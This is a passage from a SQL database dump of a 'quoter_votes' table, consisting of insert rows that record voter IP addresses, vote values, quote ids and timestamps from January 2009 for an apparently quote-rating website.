  (11164,'78.24.224.53','',0,55,1231403280),
  (11165,'64.1.215.165','',0,246,1231403458),
  (11166,'129.143.15.170','',0,206,1231403991),
  (11167,'62.212.95.45','',0,207,1231404010),
  (11168,'139.91.200.198','',0,212,1231404013),
  (11169,'121.108.31.23','',0,208,1231404021),
  (11170,'202.154.187.134','',0,213,1231404049),
  (11171,'190.128.134.126','',0,205,1231404062),
  (11172,'66.195.150.202','',0,203,1231404075),
  (11173,'194.146.228.240','',0,201,1231404084),
  (11174,'134.96.191.156','',0,204,1231404103),
  (11175,'151.8.237.37','',0,202,1231404131),
  (11176,'64.1.215.165','',0,249,1231404290),
  (11177,'72.30.65.40','',0,307,1231404524),
  (11178,'72.30.65.40','',0,77,1231406266),
  (11179,'72.30.65.40','',0,342,1231407138),
  (11180,'66.249.66.47','',0,44,1231407575),
  (11181,'72.30.65.40','',0,246,1231407817),
  (11182,'213.145.154.57','',0,341,1231408386),
  (11183,'66.249.66.47','',0,234,1231409036),
  (11184,'64.1.215.165','',0,85,1231409411),
  (11185,'64.1.215.165','',0,94,1231410961),
  (11186,'64.1.215.165','',0,76,1231411920),
  (11187,'66.249.66.47','',0,54,1231412866),
  (11188,'217.146.146.246','',0,332,1231412983),
  (11189,'217.146.146.246','',0,340,1231413110),
  (11190,'217.146.146.246','',0,310,1231413145),
  (11191,'92.50.248.46','',0,341,1231414021),
  (11192,'64.1.215.165','',0,89,1231414134),
  (11193,'64.1.215.165','',0,331,1231414276),
  (11194,'81.25.46.86','',0,259,1231414654),
  (11195,'85.175.158.148','',0,341,1231415313),
  (11196,'64.1.215.165','',0,297,1231416468),
  (11197,'64.1.215.165','',0,120,1231417447),
  (11198,'64.1.215.165','',0,262,1231417542),
  (11199,'64.1.215.165','',0,146,1231417804),
  (11200,'72.30.65.40','',0,85,1231417957),
  (11201,'72.30.65.40','',0,316,1231418916),
  (11202,'64.1.215.165','',0,143,1231418967),
  (11203,'64.1.215.165','',0,309,1231419385),
  (11204,'66.249.66.47','',0,243,1231420021),
  (11205,'64.1.215.165','',0,18,1231420204),
  (11206,'193.138.84.78','',0,324,1231420630),
  (11207,'64.1.215.165','',0,86,1231420721),
  (11208,'193.138.84.78','',0,279,1231420729),
  (11209,'193.138.84.78','',0,270,1231420747),
  (11210,'83.167.73.116','',0,316,1231421352),
  (11211,'64.1.215.165','',0,320,1231422062),
  (11212,'195.222.14.137','',0,249,1231422079),
  (11213,'64.1.215.165','',0,124,1231422787),
  (11214,'72.30.65.40','',0,114,1231423005),
  (11215,'64.1.215.165','',0,303,1231423242),
  (11216,'87.225.47.163','',0,339,1231425221),
  (11217,'95.24.43.250','',0,344,1231425532),
  (11218,'64.1.215.165','',0,137,1231425730),
  (11219,'64.1.215.165','',0,231,1231426058),
  (11220,'62.168.173.90','',0,344,1231426084),
  (11221,'64.1.215.165','',0,61,1231426943),
  (11222,'64.1.215.165','',0,90,1231427181),
  (11223,'64.1.215.165','',0,144,1231427402),
  (11224,'64.1.215.165','',0,317,1231427783),
  (11225,'212.112.101.58','',0,340,1231428339),
  (11226,'217.21.54.116','',0,344,1231428532),
  (11227,'81.18.116.69','',0,344,1231428719),
  (11228,'81.18.116.69','',0,322,1231428830),
  (11229,'94.178.158.94','',0,343,1231429109),
  (11230,'64.1.215.165','',0,324,1231429130),
  (11231,'74.6.18.241','',0,231,1231429756),
  (11232,'217.197.1.223','',0,339,1231430520),
  (11233,'94.51.146.151','',0,339,1231430553),
  (11234,'217.197.1.223','',0,344,1231430614),
  (11235,'217.197.1.223','',0,343,1231430619),
  (11236,'64.1.215.165','',0,328,1231431086),
  (11237,'77.122.63.249','',0,344,1231431595),
  (11238,'78.106.183.21','',0,299,1231432347),
  (11239,'78.106.183.21','',0,212,1231432527),
  (11240,'78.106.183.21','',0,55,1231432541),
  (11241,'78.106.183.21','',0,29,1231432549),
  (11242,'64.1.215.165','',0,87,1231432689),
  (11243,'78.106.183.21','',0,173,1231432813),
  (11244,'78.106.183.21','',0,18,1231432816),
  (11245,'78.106.183.21','',0,21,1231432831),
  (11246,'78.106.183.21','',0,56,1231432834),
  (11247,'78.106.183.21','',0,120,1231432841),
  (11248,'74.6.18.241','',0,251,1231432847),
  (11249,'78.106.183.21','',0,338,1231433068),
  (11250,'78.106.183.21','',0,335,1231433104),
  (11251,'78.106.183.21','',0,332,1231433207),
  (11252,'78.106.183.21','',0,328,1231433289),
  (11253,'74.6.18.241','',0,342,1231433617),
  (11254,'78.106.183.21','',0,325,1231433754),
  (11255,'78.106.183.21','',0,324,1231433925),
  (11256,'78.106.183.21','',0,320,1231434016),
  (11257,'78.106.183.21','',0,318,1231434063),
  (11258,'78.106.183.21','',0,317,1231434109),
  (11259,'78.106.183.21','',0,316,1231434152),
  (11260,'78.106.183.21','',0,315,1231434201),
  (11261,'78.106.183.21','',0,312,1231434241),
  (11262,'78.106.183.21','',0,310,1231434425),
  (11263,'195.26.92.114','',0,344,1231434671),
  (11264,'195.26.92.114','',0,335,1231434924),
  (11265,'64.1.215.165','',0,85,1231435388),
  (11266,'78.37.124.4','',0,212,1231435622),
  (11267,'78.37.115.248','',0,346,1231435926),
  (11268,'85.140.117.103','',0,346,1231436026),
  (11269,'85.140.117.103','',0,345,1231436064),
  (11270,'85.140.117.103','',0,344,1231436089),
  (11271,'85.140.117.103','',0,343,1231436306),
  (11272,'85.140.117.103','',0,341,1231436382),
  (11273,'85.140.117.103','',0,340,1231436470),
  (11274,'85.140.117.103','',0,339,1231436507),
  (11275,'82.151.112.79','',0,338,1231436526),
  (11276,'85.140.117.103','',0,338,1231436533),
  (11277,'85.140.117.103','',0,335,1231436661),
  (11278,'85.140.117.103','',0,334,1231436711),
  (11279,'92.49.191.237','',0,318,1231437055),
  (11280,'74.6.18.241','',0,229,1231437643),
  (11281,'64.1.215.165','',0,324,1231437817),
  (11282,'64.1.215.165','',0,137,1231438411),
  (11283,'64.1.215.165','',0,246,1231438571),
  (11284,'92.46.240.4','',0,345,1231439844),
  (11285,'156.17.237.13','',0,347,1231439917),
  (11286,'217.70.115.124','',0,326,1231440062),
  (11287,'64.1.215.165','',0,236,1231440988),
  (11288,'217.70.115.124','',0,270,1231441608),
  (11289,'217.197.1.223','',0,339,1231441836),
  (11290,'64.1.215.165','',0,74,1231442702),
  (11291,'64.1.215.165','',0,297,1231442911),
  (11292,'64.1.215.165','',0,248,1231442985),
  (11293,'64.1.215.165','',0,320,1231443062),
  (11294,'193.33.49.19','',0,346,1231443166),
  (11295,'74.6.18.241','',0,55,1231443423),
  (11296,'94.253.54.192','',0,344,1231443506),
  (11297,'94.253.54.192','',0,345,1231443527),
  (11298,'94.253.54.192','',0,338,1231443580),
  (11299,'91.149.133.122','',0,343,1231444256),
  (11300,'64.1.215.165','',0,70,1231444578),
  (11301,'74.6.18.241','',0,216,1231445327),
  (11302,'64.1.215.165','',0,48,1231445490),
  (11303,'78.37.115.248','',0,346,1231447215),
  (11304,'64.1.215.165','',0,75,1231448065),
  (11305,'93.125.25.252','',0,347,1231448225),
  (11306,'64.1.215.165','',0,140,1231448240),
  (11307,'64.1.215.165','',0,53,1231449009),
  (11308,'90.155.152.53','',0,345,1231451367),
  (11309,'64.1.215.165','',0,39,1231451524),
  (11310,'74.6.18.241','',0,220,1231451667),
  (11311,'77.88.30.246','',0,77,1231451764),
  (11312,'77.88.30.246','',0,254,1231451777),
  (11313,'77.88.30.246','',0,249,1231451787),
  (11314,'77.88.30.246','',0,342,1231451801),
  (11315,'77.88.30.246','',0,243,1231451811),
  (11316,'77.88.30.246','',0,248,1231451819),
  (11317,'77.88.30.246','',0,341,1231451841),
  (11318,'77.88.30.246','',0,245,1231451858),
  (11319,'77.88.30.246','',0,253,1231451872),
  (11320,'64.1.215.165','',0,250,1231451920),
  (11321,'77.88.30.246','',0,241,1231451926),
  (11322,'77.88.30.246','',0,251,1231451968),
  (11323,'77.88.30.246','',0,73,1231452052),
  (11324,'77.88.30.246','',0,246,1231452080),
  (11325,'90.155.152.53','',0,343,1231452140),
  (11326,'64.1.215.165','',0,25,1231452230),
  (11327,'74.6.18.241','',0,343,1231452296),
  (11328,'69.205.113.136','',0,345,1231452976),
  (11329,'69.205.113.136','',0,347,1231452986),
  (11330,'90.155.152.53','',0,347,1231452993),
  (11331,'91.185.203.253','',0,345,1231453197),
  (11332,'90.155.152.53','',0,346,1231453215),
  (11333,'91.185.203.253','',0,346,1231453235),
  (11334,'91.185.203.253','',0,347,1231453241),
  (11335,'91.185.203.253','',0,343,1231453242),
  (11336,'91.185.203.253','',0,342,1231453256),
  (11337,'91.185.203.253','',0,340,1231453257),
  (11338,'91.185.203.253','',0,339,1231453264),
  (11339,'90.155.152.53','',0,342,1231453291),
  (11340,'90.155.152.53','',0,338,1231453297),
  (11341,'90.155.152.53','',0,340,1231453298),
  (11342,'90.155.152.53','',0,337,1231453300),
  (11343,'90.155.152.53','',0,339,1231453301),
  (11344,'89.113.75.72','',0,347,1231453461),
  (11345,'85.25.145.98','',0,337,1231453527),
  (11346,'85.25.145.98','',0,338,1231453532),
  (11347,'85.25.145.98','',0,339,1231453535),
  (11348,'85.25.145.98','',0,340,1231453540),
  (11349,'85.25.145.98','',0,343,1231453545),
  (11350,'85.25.145.98','',0,342,1231453546),
  (11351,'85.25.145.98','',0,344,1231453565),
  (11352,'85.25.145.98','',0,345,1231453567),
  (11353,'85.25.145.98','',0,346,1231453572),
  (11354,'85.25.145.98','',0,347,1231453574),
  (11355,'74.6.18.241','',0,345,1231453639),
  (11356,'89.113.75.72','',0,344,1231453697),
  (11357,'79.171.124.57','',0,347,1231453826),
  (11358,'90.155.152.53','',0,344,1231453861),
  (11359,'78.129.201.189','',0,343,1231453879),
  (11360,'78.129.201.189','',0,344,1231453883),
  (11361,'78.37.124.4','',0,212,1231453884),
  (11362,'78.129.201.189','',0,345,1231453886),
  (11363,'78.129.201.189','',0,346,1231453887),
  (11364,'89.113.75.72','',0,343,1231453888),
  (11365,'78.129.201.189','',0,347,1231453890),
  (11366,'79.171.124.57','',0,342,1231453894),
  (11367,'78.129.201.189','',0,337,1231453894),
  (11368,'78.129.201.189','',0,338,1231453895),
  (11369,'78.129.201.189','',0,339,1231453900),
  (11370,'78.129.201.189','',0,340,1231453906),
  (11371,'78.129.201.189','',0,342,1231453907),
  (11372,'64.1.215.165','',0,219,1231454002),
  (11373,'79.171.124.57','',0,345,1231454099),
  (11374,'79.171.124.57','',0,303,1231454132),
  (11375,'79.171.124.57','',0,290,1231454144),
  (11376,'78.37.124.4','',0,337,1231454290),
  (11377,'74.6.18.241','',0,203,1231455065),
  (11378,'64.1.215.165','',0,263,1231455279),
  (11379,'94.77.138.6','',0,234,1231456038),
  (11380,'64.1.215.165','',0,222,1231456203),
  (11381,'74.6.18.241','',0,233,1231456711),
  (11382,'91.122.19.50','',0,346,1231457387),
  (11383,'91.122.19.50','',0,347,1231457399),
  (11384,'74.6.18.241','',0,6,1231458250),
  (11385,'64.1.215.165','',0,73,1231459693),
  (11386,'64.1.215.165','',0,262,1231460386),
  (11387,'64.1.215.165','',0,212,1231460523),
  (11388,'89.138.22.217','',0,347,1231460747),
  (11389,'64.1.215.165','',0,206,1231461880),
  (11390,'64.1.215.165','',0,229,1231462162),
  (11391,'74.6.18.241','',0,272,1231462210),
  (11392,'64.1.215.165','',0,325,1231463307),
  (11393,'64.1.215.165','',0,190,1231464821),
  (11394,'67.195.37.171','',0,343,1231465499),
  (11395,'64.1.215.165','',0,250,1231465737),
  (11396,'64.1.215.165','',0,98,1231465783),
  (11397,'64.1.215.165','',0,236,1231466131),
  (11398,'74.6.18.241','',0,55,1231466184),
  (11399,'94.27.119.139','',0,347,1231467278),
  (11400,'94.27.119.139','',0,342,1231467341),
  (11401,'64.1.215.165','',0,4,1231467548),
  (11402,'94.27.119.139','',0,235,1231467576),
  (11403,'94.27.119.139','',0,216,1231467797),
  (11404,'94.27.119.139','',0,215,1231467914),
  (11405,'94.27.119.139','',0,173,1231468456),
  (11406,'74.6.18.216','',0,222,1231470881),
  (11407,'64.1.215.165','',0,206,1231470888),
  (11408,'95.56.11.46','',0,1,1231470905),
  (11409,'95.56.11.46','',0,55,1231470907),
  (11410,'95.56.11.46','',0,258,1231470929),
  (11411,'64.1.215.165','',0,231,1231471744),
  (11412,'72.30.78.224','',0,81,1231472540),
  (11413,'64.1.215.165','',0,230,1231472947),
  (11414,'72.30.78.224','',0,134,1231473137),
  (11415,'64.1.215.165','',0,233,1231473692),
  (11416,'64.1.215.165','',0,318,1231474216),
  (11417,'80.243.71.189','',0,343,1231474319),
  (11418,'64.1.215.165','',0,53,1231474481),
  (11419,'72.30.78.224','',0,270,1231475326),
  (11420,'64.1.215.165','',0,274,1231475954),
  (11421,'64.1.215.165','',0,243,1231476339),
  (11422,'72.30.78.224','',0,77,1231477301),
  (11423,'72.30.78.224','',0,254,1231477477),
  (11424,'64.1.215.165','',0,305,1231477986),
  (11425,'89.113.75.72','',0,347,1231480433),
  (11426,'72.30.78.224','',0,221,1231480985),
  (11427,'72.30.78.224','',0,343,1231482528),
  (11428,'89.107.82.77','',0,1,1231482651),
  (11429,'89.107.82.77','',0,55,1231482653),
  (11430,'72.30.78.224','',0,279,1231483104),
  (11431,'72.30.78.224','',0,24,1231484611),
  (11432,'212.55.66.18','',0,343,1231484627),
  (11433,'78.37.124.4','',0,344,1231484923),
  (11434,'78.37.124.4','',0,212,1231485113),
  (11435,'87.225.47.163','',0,348,1231486866),
  (11436,'64.1.215.165','',0,317,1231487045),
  (11437,'217.8.236.185','',0,348,1231487052),
  (11438,'195.131.4.189','',0,348,1231487100),
  (11439,'81.25.33.5','',0,346,1231487116),
  (11440,'83.149.41.48','',0,349,1231488073),
  (11441,'217.21.54.116','',0,347,1231488530),
  (11442,'64.1.215.165','',0,50,1231489489),
  (11443,'72.30.78.224','',0,274,1231490256),
  (11444,'83.149.41.48','',0,347,1231490485),
  (11445,'83.149.41.48','',0,345,1231490505),
  (11446,'64.1.215.165','',0,154,1231490976),
  (11447,'89.113.75.72','',0,348,1231491235),
  (11448,'64.1.215.165','',0,88,1231491367),
  (11449,'64.1.215.165','',0,248,1231491460),
  (11450,'87.225.47.163','',0,349,1231491732),
  (11451,'72.30.78.224','',0,99,1231491799),
  (11452,'66.249.66.47','',0,340,1231491821),
  (11453,'81.18.116.69','',0,349,1231491878),
  (11454,'91.195.22.32','',0,349,1231491987),
  (11455,'91.195.22.32','',0,347,1231492025),
  (11456,'91.195.22.32','',0,325,1231492877),
  (11457,'91.195.22.32','',0,316,1231493022),
  (11458,'64.1.215.165','',0,227,1231494324),
  (11459,'94.179.8.230','',0,256,1231494338),
  (11460,'93.80.176.165','',0,343,1231494433),
  (11461,'64.1.215.165','',0,286,1231496195),
  (11462,'64.1.215.165','',0,264,1231496831),
  (11463,'72.30.78.224','',0,212,1231496906),
  (11464,'80.94.230.28','',0,286,1231497008),
  (11465,'94.180.149.178','',0,298,1231497107),
  (11466,'66.249.66.47','',0,335,1231497363),
  (11467,'90.155.152.53','',0,345,1231497462),
  (11468,'64.1.215.165','',0,256,1231497889),
  (11469,'193.232.92.242','',0,349,1231499003),
  (11470,'193.232.92.242','',0,348,1231499062),
  (11471,'193.232.92.242','',0,347,1231499070),
  (11472,'72.30.78.224','',0,265,1231499509),
  (11473,'94.178.253.180','',0,54,1231499603),
  (11474,'72.30.78.224','',0,130,1231500699),
  (11475,'217.197.1.223','',0,339,1231501153),
  (11476,'91.122.19.50','',0,344,1231501391),
  (11477,'91.122.19.50','',0,346,1231501395),
  (11478,'91.122.19.50','',0,347,1231501402),
  (11479,'91.122.19.50','',0,348,1231501430),
  (11480,'91.122.19.50','',0,349,1231501451),
  (11481,'64.1.215.165','',0,337,1231501627),
  (11482,'91.122.19.50','',0,351,1231501873),
  (11483,'72.30.78.224','',0,272,1231502410),
  (11484,'91.202.197.79','',0,350,1231502517),
  (11485,'81.25.46.86','',0,349,1231503413),
  (11486,'92.47.252.229','',0,55,1231503525),
  (11487,'92.47.252.229','',0,1,1231503527),
  (11488,'64.1.215.165','',0,146,1231503638),
  (11489,'92.47.252.229','',0,258,1231503675),
  (11490,'95.48.22.66','',0,349,1231503897),
  (11491,'89.138.22.217','',0,351,1231503930),
  (11492,'64.1.215.165','',0,2,1231504305),
  (11493,'66.249.66.47','',0,335,1231504612),
  (11494,'64.1.215.165','',0,270,1231504688),
  (11495,'64.1.215.165','',0,119,1231504913),
  (11496,'65.55.105.191','',0,332,1231504956),
  (11497,'65.55.110.66','',0,332,1231505232),
  (11498,'64.1.215.165','',0,230,1231505494),
  (11499,'66.249.66.47','',0,334,1231506942),
  (11500,'72.30.78.224','',0,1,1231508410);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 11500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (11501,'64.1.215.165','',0,334,1231508633),
  (11502,'72.30.78.224','',0,253,1231508637),
  (11503,'72.30.78.224','',0,62,1231509178),
  (11504,'194.44.221.46','',0,347,1231509400),
  (11505,'195.26.92.114','',0,347,1231509592),
  (11506,'78.37.124.4','',0,212,1231510034),
  (11507,'66.249.66.47','',0,340,1231510230),
  (11508,'193.33.49.18','',0,348,1231511937),
  (11509,'193.33.49.18','',0,349,1231511990),
  (11510,'193.33.49.18','',0,351,1231512056),
  (11511,'64.1.215.165','',0,25,1231512465),
  (11512,'82.144.212.80','',0,344,1231512691),
  (11513,'64.1.215.165','',0,337,1231512965),
  (11514,'72.30.78.224','',0,138,1231513426),
  (11515,'66.249.66.47','',0,337,1231513537),
  (11516,'95.48.22.66','',0,347,1231514054),
  (11517,'64.1.215.165','',0,203,1231514716),
  (11518,'64.1.215.165','',0,222,1231515073),
  (11519,'67.195.37.171','',0,320,1231515501),
  (11520,'72.30.78.224','',0,177,1231515863),
  (11521,'89.109.37.141','',0,337,1231516322),
  (11522,'64.1.215.165','',0,338,1231518399),
  (11523,'64.1.215.165','',0,1,1231519772),
  (11524,'88.204.16.169','',0,347,1231520231),
  (11525,'72.30.78.224','',0,144,1231522466),
  (11526,'83.149.40.49','',0,351,1231522822),
  (11527,'78.37.120.158','',0,212,1231523704),
  (11528,'194.85.160.55','',0,337,1231524618),
  (11529,'72.30.78.224','',0,208,1231524775),
  (11530,'72.30.78.224','',0,87,1231524996),
  (11531,'85.234.62.8','',0,346,1231525575),
  (11532,'85.234.62.8','',0,55,1231525757),
  (11533,'72.30.78.224','',0,152,1231525818),
  (11534,'93.94.157.242','',0,349,1231525950),
  (11535,'93.94.157.242','',0,1,1231526054),
  (11536,'217.21.40.13','',0,108,1231526145),
  (11537,'213.33.238.142','',0,249,1231526168),
  (11538,'64.1.215.165','',0,343,1231526209),
  (11539,'92.101.223.58','',0,56,1231526275),
  (11540,'89.239.164.225','',0,340,1231526314),
  (11541,'77.66.165.2','',0,340,1231526348),
  (11542,'62.221.32.158','',0,18,1231526385),
  (11543,'80.85.181.84','',0,85,1231526394),
  (11544,'89.252.10.5','',0,286,1231526461),
  (11545,'89.252.10.5','',0,213,1231526649),
  (11546,'80.95.44.150','',0,215,1231526663),
  (11547,'64.1.215.165','',0,270,1231526759),
  (11548,'94.51.153.49','',0,339,1231526769),
  (11549,'81.27.245.69','',0,235,1231526776),
  (11550,'89.252.10.5','',0,56,1231526800),
  (11551,'78.107.237.247','',0,265,1231527022),
  (11552,'80.95.44.150','',0,299,1231527072),
  (11553,'72.30.78.224','',0,307,1231527359),
  (11554,'72.30.78.224','',0,227,1231527690),
  (11555,'91.77.158.175','',0,216,1231527748),
  (11556,'65.55.105.202','',0,324,1231527861),
  (11557,'213.141.154.71','',0,350,1231528138),
  (11558,'213.141.154.71','',0,351,1231528142),
  (11559,'213.141.154.71','',0,349,1231528172),
  (11560,'64.1.215.165','',0,340,1231528186),
  (11561,'212.98.181.71','',0,338,1231528253),
  (11562,'212.98.181.71','',0,349,1231528274),
  (11563,'212.98.181.71','',0,55,1231528538),
  (11564,'212.98.181.71','',0,1,1231528545),
  (11565,'212.98.181.71','',0,29,1231528720),
  (11566,'89.41.65.117','',0,347,1231528805),
  (11567,'195.122.236.130','',0,29,1231528880),
  (11568,'195.122.236.130','',0,56,1231528888),
  (11569,'77.40.21.117','',0,346,1231529217),
  (11570,'85.21.237.93','',0,331,1231529278),
  (11571,'65.55.105.194','',0,331,1231529395),
  (11572,'65.55.110.212','',0,324,1231529511),
  (11573,'213.171.45.18','',0,234,1231529640),
  (11574,'72.30.78.224','',0,265,1231529903),
  (11575,'193.138.244.170','',0,163,1231530019),
  (11576,'81.94.16.144','',0,265,1231530222),
  (11577,'84.22.141.80','',0,85,1231530324),
  (11578,'84.22.141.80','',0,265,1231530347),
  (11579,'84.22.141.80','',0,12,1231530362),
  (11580,'81.94.16.144','',0,313,1231530362),
  (11581,'79.126.2.92','',0,265,1231530407),
  (11582,'83.239.148.218','',0,243,1231530419),
  (11583,'83.237.96.123','',0,349,1231530692),
  (11584,'217.118.90.172','',0,342,1231530793),
  (11585,'81.94.16.144','',0,119,1231530812),
  (11586,'84.22.141.80','',0,313,1231530864),
  (11587,'217.118.90.172','',0,318,1231530905),
  (11588,'84.22.141.80','',0,130,1231530950),
  (11589,'84.22.141.80','',0,84,1231530977),
  (11590,'84.22.141.80','',0,315,1231531018),
  (11591,'84.22.141.80','',0,219,1231531089),
  (11592,'81.94.16.144','',0,213,1231531100),
  (11593,'193.19.206.251','',0,347,1231531162),
  (11594,'84.22.141.80','',0,221,1231531219),
  (11595,'195.66.137.80','',0,328,1231531254),
  (11596,'84.22.141.80','',0,118,1231531308),
  (11597,'84.22.141.80','',0,110,1231531341),
  (11598,'84.22.141.80','',0,74,1231531360),
  (11599,'91.195.90.2','',0,85,1231531400),
  (11600,'84.22.141.80','',0,24,1231531412),
  (11601,'84.22.141.80','',0,23,1231531454),
  (11602,'84.22.141.80','',0,331,1231531512),
  (11603,'84.22.141.80','',0,138,1231531579),
  (11604,'84.22.141.80','',0,100,1231531612),
  (11605,'84.22.141.80','',0,55,1231531621),
  (11606,'217.21.40.13','',0,71,1231531638),
  (11607,'84.22.141.80','',0,60,1231531651),
  (11608,'217.21.40.13','',0,76,1231531657),
  (11609,'84.22.141.80','',0,303,1231531719),
  (11610,'84.22.141.80','',0,283,1231531765),
  (11611,'84.22.141.80','',0,328,1231531791),
  (11612,'65.55.105.196','',0,320,1231531820),
  (11613,'217.21.40.13','',0,303,1231531821),
  (11614,'77.108.206.46','',0,349,1231531846),
  (11615,'84.22.141.80','',0,339,1231531859),
  (11616,'84.22.141.80','',0,349,1231531891),
  (11617,'84.22.141.80','',0,333,1231531954),
  (11618,'217.21.40.13','',0,220,1231531970),
  (11619,'84.22.141.80','',0,332,1231531970),
  (11620,'83.239.148.218','',0,1,1231531978),
  (11621,'84.22.141.80','',0,335,1231531981),
  (11622,'84.22.141.80','',0,326,1231532000),
  (11623,'84.22.141.80','',0,231,1231532097),
  (11624,'84.22.141.80','',0,220,1231532126),
  (11625,'92.101.43.67','',0,279,1231532132),
  (11626,'84.22.141.80','',0,207,1231532147),
  (11627,'217.21.40.13','',0,184,1231532156),
  (11628,'94.27.112.7','',0,216,1231532191),
  (11629,'84.22.141.80','',0,205,1231532210),
  (11630,'84.22.141.80','',0,86,1231532252),
  (11631,'84.22.141.80','',0,75,1231532277),
  (11632,'84.22.141.80','',0,71,1231532302),
  (11633,'85.21.145.110','',0,342,1231532343),
  (11634,'84.22.141.80','',0,48,1231532344),
  (11635,'95.37.91.134','',0,348,1231532365),
  (11636,'84.22.141.80','',0,30,1231532374),
  (11637,'84.22.141.80','',0,21,1231532377),
  (11638,'95.37.91.134','',0,340,1231532488),
  (11639,'91.146.52.46','',0,347,1231532523),
  (11640,'195.230.103.1','',0,1,1231532539),
  (11641,'195.230.103.1','',0,55,1231532544),
  (11642,'92.101.43.67','',0,250,1231532581),
  (11643,'84.22.141.80','',0,325,1231532655),
  (11644,'84.22.141.80','',0,286,1231532680),
  (11645,'217.21.40.13','',0,21,1231532720),
  (11646,'84.22.141.80','',0,248,1231532729),
  (11647,'84.22.141.80','',0,247,1231532755),
  (11648,'84.22.141.80','',0,235,1231532786),
  (11649,'85.21.145.110','',0,317,1231532822),
  (11650,'84.22.141.80','',0,227,1231532840),
  (11651,'84.22.141.80','',0,216,1231532867),
  (11652,'84.22.141.80','',0,215,1231532957),
  (11653,'77.109.63.21','',0,249,1231532966),
  (11654,'77.109.63.21','',0,283,1231532968),
  (11655,'91.146.52.46','',0,328,1231533147),
  (11656,'91.146.52.46','',0,331,1231533184),
  (11657,'91.146.52.46','',0,326,1231533372),
  (11658,'91.146.52.46','',0,322,1231533538),
  (11659,'77.51.76.224','',0,62,1231533573),
  (11660,'91.76.188.52','',0,245,1231533813),
  (11661,'65.55.105.196','',0,322,1231533942),
  (11662,'91.146.52.46','',0,305,1231533969),
  (11663,'91.146.52.46','',0,299,1231534130),
  (11664,'91.76.188.52','',0,234,1231534176),
  (11665,'91.146.52.46','',0,298,1231534329),
  (11666,'91.76.188.52','',0,87,1231534359),
  (11667,'64.1.215.165','',0,279,1231534510),
  (11668,'91.146.52.46','',0,291,1231534530),
  (11669,'91.146.52.46','',0,292,1231534537),
  (11670,'91.76.188.52','',0,110,1231534682),
  (11671,'91.146.52.46','',0,288,1231534735),
  (11672,'91.146.52.46','',0,286,1231534755),
  (11673,'91.76.188.52','',0,23,1231534799),
  (11674,'65.55.110.46','',0,322,1231534920),
  (11675,'91.122.126.194','',0,119,1231534953),
  (11676,'91.76.188.52','',0,24,1231534955),
  (11677,'91.76.188.52','',0,343,1231535165),
  (11678,'91.76.188.52','',0,339,1231535191),
  (11679,'91.76.188.52','',0,335,1231535203),
  (11680,'91.124.130.201','',0,325,1231535282),
  (11681,'91.76.188.52','',0,328,1231535358),
  (11682,'91.76.188.52','',0,327,1231535395),
  (11683,'91.76.188.52','',0,326,1231535438),
  (11684,'91.76.188.52','',0,322,1231535542),
  (11685,'91.76.188.52','',0,305,1231535626),
  (11686,'91.124.130.201','',0,286,1231535632),
  (11687,'62.140.253.9','',0,351,1231535710),
  (11688,'91.124.130.201','',0,248,1231535717),
  (11689,'91.124.130.201','',0,247,1231535782),
  (11690,'62.140.253.9','',0,347,1231535784),
  (11691,'91.76.188.52','',0,264,1231535787),
  (11692,'91.78.229.92','',0,347,1231535790),
  (11693,'91.78.229.92','',0,345,1231535803),
  (11694,'62.140.253.9','',0,346,1231535809),
  (11695,'91.124.130.201','',0,235,1231535812),
  (11696,'64.1.215.165','',0,318,1231535844),
  (11697,'62.140.253.9','',0,343,1231535885),
  (11698,'91.76.188.52','',0,262,1231535945),
  (11699,'91.76.188.52','',0,250,1231536053),
  (11700,'85.172.35.10','',0,55,1231536081),
  (11701,'91.76.188.52','',0,242,1231536174),
  (11702,'91.76.188.52','',0,204,1231536470),
  (11703,'91.76.188.52','',0,197,1231536609),
  (11704,'64.1.215.165','',0,263,1231536838),
  (11705,'91.76.188.52','',0,161,1231537000),
  (11706,'91.76.188.52','',0,140,1231537338),
  (11707,'64.1.215.165','',0,332,1231537444),
  (11708,'91.76.188.52','',0,120,1231537529),
  (11709,'193.19.82.179','',0,349,1231537566),
  (11710,'91.76.188.52','',0,107,1231537656),
  (11711,'91.76.188.52','',0,104,1231537763),
  (11712,'193.19.82.179','',0,173,1231537888),
  (11713,'193.19.82.179','',0,18,1231537916),
  (11714,'193.19.82.179','',0,120,1231537953),
  (11715,'193.19.82.179','',0,21,1231538001),
  (11716,'91.76.188.52','',0,93,1231538041),
  (11717,'65.55.105.202','',0,326,1231538127),
  (11718,'92.101.153.233','',0,29,1231538128),
  (11719,'72.30.78.224','',0,163,1231538173),
  (11720,'91.76.188.52','',0,53,1231538254),
  (11721,'92.101.153.233','',0,93,1231538272),
  (11722,'92.101.153.233','',0,107,1231538300),
  (11723,'91.76.188.52','',0,29,1231538336),
  (11724,'65.55.110.41','',0,326,1231538413),
  (11725,'91.76.188.52','',0,13,1231538425),
  (11726,'89.31.118.251','',0,309,1231538822),
  (11727,'93.185.182.24','',0,353,1231538884),
  (11728,'64.1.215.165','',0,60,1231539392),
  (11729,'64.1.215.165','',0,84,1231539419),
  (11730,'91.122.28.83','',0,343,1231539516),
  (11731,'89.113.75.72','',0,353,1231539905),
  (11732,'64.1.215.165','',0,274,1231539985),
  (11733,'66.231.188.53','',0,318,1231540285),
  (11734,'72.30.78.224','',0,241,1231540649),
  (11735,'89.191.241.225','',0,352,1231540741),
  (11736,'65.55.105.202','',0,322,1231541272),
  (11737,'65.55.105.193','',0,333,1231541321),
  (11738,'65.55.110.50','',0,333,1231541578),
  (11739,'72.30.78.224','',0,262,1231541675),
  (11740,'64.1.215.165','',0,326,1231541722),
  (11741,'91.210.20.2','',0,333,1231542332),
  (11742,'91.210.20.2','',0,291,1231542354),
  (11743,'72.30.78.224','',0,350,1231542503),
  (11744,'72.30.78.224','',0,345,1231542571),
  (11745,'72.30.78.224','',0,347,1231542598),
  (11746,'72.30.78.224','',0,346,1231542599),
  (11747,'72.30.78.224','',0,353,1231542617),
  (11748,'72.30.78.224','',0,348,1231542857),
  (11749,'72.30.78.224','',0,352,1231542874),
  (11750,'64.1.215.165','',0,39,1231542942),
  (11751,'72.30.78.224','',0,351,1231543103),
  (11752,'72.30.78.224','',0,349,1231543379),
  (11753,'195.222.71.77','',0,1,1231543895),
  (11754,'85.196.201.131','',0,350,1231543982),
  (11755,'77.232.21.86','',0,351,1231544576),
  (11756,'72.30.78.224','',0,113,1231544880),
  (11757,'64.1.215.165','',0,243,1231545274),
  (11758,'72.30.78.224','',0,207,1231545369),
  (11759,'80.251.112.43','',0,289,1231546196),
